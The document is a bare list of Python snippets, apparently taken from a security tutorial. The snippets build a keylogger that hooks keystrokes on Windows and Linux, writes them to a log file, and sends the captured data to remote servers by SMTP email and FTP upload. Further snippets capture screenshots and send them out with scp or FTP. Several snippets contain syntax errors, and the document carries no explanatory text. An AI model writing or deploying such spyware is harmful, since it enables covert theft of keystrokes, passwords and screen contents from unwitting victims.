["```py\nimport pyHook, pythoncom, sys, logging \n\n```", "```py\nfile_log='C:\\\\log.txt' \n\n```", "```py\ndef OnKeyboardEvent(event): \n    logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s') \n    chr(event.Ascii) \n    logging.log(10,chr(event.Ascii)) \n    return True \n\n```", "```py\nhooks_manager = pyHook.HookManager() \n\n```", "```py\nhooks_manager.KeyDown = OnKeyboardEvent \nhooks_manager.HookKeyboard() \npythoncom.PumpMessages() \n\n```", "```py\nimport pyxhook \nfile_log=/home/rejah/Desktop/file.log' \ndef OnKeyboardEvent(event): \n   k = event.Key \n\n    if k == \"space\": k = \" \" \n\n   with open(file_log, 'a+') as keylogging: \n      keylogging.write('%s\\n' % k)   \n\n#instantiate HookManager class \nhooks_manager = pyxhook.HookManager() \n\n#listen to all keystrokes \nhooks_manager.KeyDown=OnKeyPress \n\n#hook the keyboard \nhooks_manager.HookKeyboard() \n\n#start the session \nhooks_manager.start() \n\n```", "```py\nimport time \nimport datetime \nimport smtplib \nfrom email.mime.text import MIMEText\n\n```", "```py\ndef sendEmail(data,to): \n    try: \n        # Provide from email address \n        from = 'you@yourdomain.com' \n        # Your SMTP username \n        username = 'keylogger' \n        # Your Email password \n        password = 'asd123' \n        # Use MIMEText to create an email \n        mail = MIMEText(data, 'html') \n        mail['Subject']  = \"Keylogger Data --\" +str(datetime.datetime.now()) \n        mail['From']=from \n        mail['To'] = to \n\n        # Send the message via your SMTP server \n        server = smtplib.SMTP('smtp.yourdomain.com:587') \n        # Enable TLS if required \n        server.starttls() \n        server.login(username,password) \n        server.sendmail(from, [to], mail.as_string()) \n        server.quit() \n    except: \n        pass\n\n```", "```py\ndef OnKeyboardEvent(event): \n    # Write character only if its not a null or backspace  \n    if event.Ascii !=0 or 8: \n        # Open log file and read the current keystrokes in log file \n        f=open('c:\\log.txt','r+') \n        buffer=f.read() \n        f.close()  \n\n        if len(buffer)%100==0 and len(buffer)%100!=0: \n            #send last 1000 characters to the email \n            send_email(buffer[-1000:].replace(\"\\n\",\"<br>\"),email) \n\n        # Open the log.txt file to update new keystrokes \n        f=open('c:\\log.txt','w') \n        keylogs=chr(event.Ascii) \n\n        # if the key pressed is ENTER, update with /n  \n        if event.Ascii==13: \n            keylogs='\\n' \n\n        #if the key pressed is space, update with space  \n        if event.Ascii==32: \n            keylogs='  ' \n\n        # Add new keystrokes to buffer \n        buffer+=keylogs \n\n        # Write the buffer to log file \n        f.write(buffer) \n        # close the log file \n        f.close() \n\n```", "```py\nimport ftplib \nimport os \n\n```", "```py\ndef uploadToFTP(data,to): \n    # Write data to a file \n    fileName=\"log-\"+str(datetime.datetime.now()+\".txt\" \n    logFile=open(fileName,\"a\") \n    logFile.write(data) \n    logFile.close() \n\n    try: \n        # Provide FTP server address \n        server = 'yourdomain.com' \n        # Your FTP username \n        username = 'keylogger' \n        # Your FTP password \n        password = 'asd123' \n        # SSL state, set 1 if SSL enabled in server \n        SSL = 0 \n        # FTP Directory to upload the file \n        directory = \"/\"  \n        # Create normal FTP connection If SSL disabled \n        if SSL==0: \n            connection=ftplib.FTP(server,username,password) \n        # Create SSL enabled FTP connection \n        elif SSL==1: \n            connection=ftplib.FTP_TLS(server,username,password) \n\n        # Change directory in FTP connection \n        connection.cwd(directory) \n        # Open the log file \n\n        logFile=open(fileName,'rb') \n        # Upload the file to FTP server \n        connection.storbinary('STOR' +' '+fileName,logFile) \n        # Close the FTP connection \n        connection.quit() \n        # Close the log file \n        logFile.close() \n        # Delete the temporary log file \n        os.remove(fileName) \n    except: \n        pass\n```", "```py\n ^[\\w!#$%&'*+\\-/=?\\^_`{|}~]+(\\.[\\w!#$%&'*+\\-/=?\\^_`{|}~]+)*@((([\\-\\w]+\\.)+[a-zA-Z]{2,4})|(([0-9]{1,3}\\.){3}[0-9]{1,3}))$ \n\n```", "```py\n(?=^.{6,}$)(?=.*\\d)(?=.*[a-zA-Z])\n\n```", "```py\nfrom PIL import ImageGrab \nimport time\n\n```", "```py\ntime.sleep(3) \nImageGrab.grab().save(\"screen_capture.jpg\", \"JPEG\") \n\n```", "```py\nImageGrab.grab(bbox=(10,10,510,510)).save(\"screen_capture.jpg\", \"JPEG\") where, bbox=(X1,Y1,X2,Y2)\n\n```", "```py\nimport wx \n\n```", "```py\nwx.App()\n\n```", "```py\nscreen = wx.ScreenDC() \nsize = screen.GetSize() \n\n```", "```py\nbmp = wx.EmptyBitmap(size[0], size[1]) \nmem = wx.MemoryDC(bmp) \n\n```", "```py\nmem.Blit(0, 0, size[0], size[1], screen, 0, 0) \ndel mem \n\n```", "```py\nbmp.SaveFile('screenshot.png', wx.BITMAP_TYPE_PNG) \n\n```", "```py\nimport os \nos.system(\"scp screenshot.png user@remote-server.com:/home/user/\")\n\n```", "```py\nimport ftplib \n\n```", "```py\nsession = ftplib.FTP('remote-server.com','user','password') \n\n```", "```py\nfile = open('screenshot.png','rb')\n\n```", "```py\nsession.storbinary('STOR screenshot.png', file)\n\n```", "```py\nfile.close()                                     \nsession.quit() \n\n```"]